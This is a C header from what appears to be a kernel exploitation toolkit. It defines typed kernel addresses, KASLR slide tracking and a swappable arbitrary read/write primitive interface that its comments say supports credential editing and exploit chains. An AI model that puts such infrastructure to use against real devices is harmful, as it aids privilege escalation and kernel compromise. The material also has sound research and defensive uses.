/* lib/rw/krw.h -- kernel addresses, and a read/write contract over them.
 *
 * Three address spaces name the same memory and are not interchangeable, so
 * each has its own type and mixing them is a compile error rather than a
 * runtime fault:
 *
 *   kimage_t   a link-time address, measured from the image base. Never valid
 *              at run time by itself.
 *   kdirect_t  a linear-map alias. Unaffected by address randomisation and
 *              therefore always valid -- which is why it is the only space the
 *              read/write primitives accept.
 *   krun_t     a runtime address. Requires a known randomisation offset, and
 *              converting to it without one traps: an unslid address written
 *              into a live structure lands in mapped memory and does nothing
 *              visible, which is the one failure no outcome can classify.
 *
 * The contract itself is deliberately small. A primitive is a pair of functions
 * over linear-map addresses plus whatever state it needs, and everything built
 * on it -- credential editing, task walking, page identity -- takes the
 * contract rather than a particular primitive. That is what lets a chain
 * install a slow primitive, use it to build a fast one, and keep every
 * consumer.
 *
 * Device constants come from the target description.
 */
#ifndef LIB_RW_KRW_H
#define LIB_RW_KRW_H

#include <stdint.h>
#include <stddef.h>
#include <stdlib.h>  /* abort() -- k_run() traps on an unknown slide */

#include "../addr/physmap.h"  /* lib_is_direct_ptr, linear-map conversions */

/* Device/link constants: supplied by targets/<device>/target.h. The fallbacks
 * exist only so this header compiles standalone. */
#ifndef KIMAGE_TEXT_BASE
#define KIMAGE_TEXT_BASE     0xffffffc008000000ULL
#endif
#ifndef P0_PAGE_OFFSET
#define P0_PAGE_OFFSET       0xffffff8000000000ULL
#endif
#ifndef P0_PHYS_OFFSET
#define P0_PHYS_OFFSET       0x80000000ULL
#endif
#ifndef P0_KERNEL_PHYS_LOAD
#define P0_KERNEL_PHYS_LOAD  0x80000000ULL
#endif
#ifndef P0_KERNEL_PHYS_DELTA
#define P0_KERNEL_PHYS_DELTA (P0_KERNEL_PHYS_LOAD - P0_PHYS_OFFSET)
#endif

/* ------------------------------- types --------------------------------- */

typedef struct { uint64_t v; } kimage_t;
typedef struct { uint64_t v; } kdirect_t;
typedef struct { uint64_t v; } krun_t;

enum kslide_state {
  SLIDE_UNKNOWN = 0,  /* nothing known -- k_run() traps                     */
  SLIDE_SUPPLIED,     /* handed in by the caller (KASLR_BASE=...)           */
  SLIDE_LEAKED,       /* derived from one leak, not yet cross-checked       */
  SLIDE_VERIFIED,     /* leak agreed with independent text pointers         */
};

struct kslide {
  uint64_t base;
  uint64_t slide;
  enum kslide_state state;
};

static inline kimage_t  k_image(uint64_t image_va)   { kimage_t a;  a.v = image_va;  return a; }
static inline kdirect_t k_direct_raw(uint64_t va)    { kdirect_t a; a.v = va;        return a; }
static inline krun_t    k_run_raw(uint64_t va)       { krun_t a;    a.v = va;        return a; }

static inline uint64_t ki_val(kimage_t a)  { return a.v; }
static inline uint64_t kd_val(kdirect_t a) { return a.v; }
static inline uint64_t kr_val(krun_t a)    { return a.v; }

static inline kimage_t  ki_add(kimage_t a,  int64_t d) { a.v += (uint64_t)d; return a; }
static inline kdirect_t kd_add(kdirect_t a, int64_t d) { a.v += (uint64_t)d; return a; }

/* -------------------------- kslide accessors --------------------------- */

static inline int kslide_known(const struct kslide *slide) {
  return slide->state != SLIDE_UNKNOWN;
}
static inline void kslide_set(
    struct kslide *slide, uint64_t base, enum kslide_state state) {
  slide->base = base;
  slide->slide = base - KIMAGE_TEXT_BASE;
  slide->state = state;
}
static inline void kslide_invalidate(struct kslide *slide) {
  slide->state = SLIDE_UNKNOWN;
}

/* -------------------------- addressing core ---------------------------- */

/* Total, KASLR-free: the physmap alias of an image address. */
static inline kdirect_t k_direct(kimage_t image) {
  uint64_t off = ki_val(image) - KIMAGE_TEXT_BASE;
  uint64_t phys = P0_KERNEL_PHYS_LOAD + off;
  return k_direct_raw((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
}
/* Offset half of the inverse of k_direct(): KIMAGE_TEXT_BASE-relative. */
static inline uint64_t k_direct_image_offset(kdirect_t direct) {
  return (kd_val(direct) - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_DELTA;
}
/* Shorthand for the very common k_direct(k_image(SYMBOL)). */
static inline kdirect_t kd_image(uint64_t image_va) {
  return k_direct(k_image(image_va));
}
/*
 * Slid runtime VA of an image address. REQUIRES a known slide and traps
 * otherwise: an unslid address written to a live kernel object lands in mapped
 * RAM with no visible effect, the failure mode no shot outcome can classify.
 */
static inline krun_t k_run(const struct kslide *slide, kimage_t image) {
  if (!kslide_known(slide)) {
    abort();
  }
  return k_run_raw(slide->base + (ki_val(image) - KIMAGE_TEXT_BASE));
}
/* Slid runtime VA of a physmap alias. */
static inline krun_t k_direct_to_run(const struct kslide *slide, kdirect_t direct) {
  return k_run_raw(slide->base + k_direct_image_offset(direct));
}
/* Runtime address of an image symbol, as a plain integer. */
static inline uint64_t lib_canon_addr(const struct kslide *slide, uint64_t image_va) {
  return kr_val(k_run(slide, k_image(image_va)));
}

static inline int kd_is_direct(kdirect_t addr) {
  return lib_is_direct_ptr((uintptr_t)kd_val(addr));
}

/* ----------------------- the R/W contract ------------------------------
 *
 * A pair of functions over linear-map addresses, plus whatever state the
 * primitive behind them needs. A chain typically installs one implementation to
 * bootstrap and a faster one afterwards; both satisfy this shape, so everything
 * built on the contract survives the swap untouched.
 *
 * Only linear-map addresses are accepted. Taking the typed form makes handing a
 * primitive a link-time or runtime address a compile error rather than a fault
 * on the device.
 */
struct krw;

typedef int (*krw_read_fn)(
    const struct krw *rw, kdirect_t addr, void *out, size_t len);
typedef int (*krw_write_fn)(
    const struct krw *rw, kdirect_t addr, const void *data, size_t len);

struct krw {
  const char *name;
  /* Whatever the installed primitive needs to perform an access. A primitive
   * driven by one descriptor uses `fd`; one that needs more -- a groomed page,
   * an address-space layout, a pair of endpoints -- puts it behind `ctx`. Both
   * are present because a contract that forced every primitive through a single
   * descriptor would exclude the more capable ones. */
  int fd;
  void *ctx;
  krw_read_fn read;
  krw_write_fn write;
};

static inline int krw_read(
    const struct krw *rw, kdirect_t addr, void *out, size_t len) {
  return rw->read(rw, addr, out, len);
}
static inline int krw_write(
    const struct krw *rw, kdirect_t addr, const void *data, size_t len) {
  return rw->write(rw, addr, data, len);
}

/*
 * krw_read64/krw_read32 return 0 both for a real zero and for a failed read.
 * A caller that must tell a zero from a failure uses krw_read(), which returns
 * a status.
 */
static inline uint64_t krw_read64(const struct krw *rw, kdirect_t addr) {
  uint64_t value = 0;
  krw_read(rw, addr, &value, sizeof(value));
  return value;
}
static inline uint32_t krw_read32(const struct krw *rw, kdirect_t addr) {
  uint32_t value = 0;
  krw_read(rw, addr, &value, sizeof(value));
  return value;
}
static inline int krw_write64(const struct krw *rw, kdirect_t addr, uint64_t value) {
  return krw_write(rw, addr, &value, sizeof(value));
}

#endif /* LIB_RW_KRW_H */
